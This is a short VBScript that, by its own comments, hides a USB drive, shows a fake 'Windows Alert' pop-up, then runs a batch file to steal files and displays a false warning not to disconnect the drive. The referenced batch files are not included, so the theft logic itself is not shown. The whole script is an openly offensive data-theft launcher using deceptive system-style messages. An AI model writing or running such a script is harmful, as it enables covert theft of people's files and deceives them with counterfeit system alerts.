DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")



''' Makes the DRIVE kinda invisable
CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True

''' Alert box, then goes and steals data (files)
z=MsgBox("Windows ran into a problem! If you dont reconize this, please close this alert.", 0+64, "Windows Alert!!!")
WScript.Sleep(1)
CreateObject("Wscript.Shell").Run """file.bat""", 1, True

a=MsgBox("Do not dissconect USB! Data will be lost.", 0+64, "External Drive")
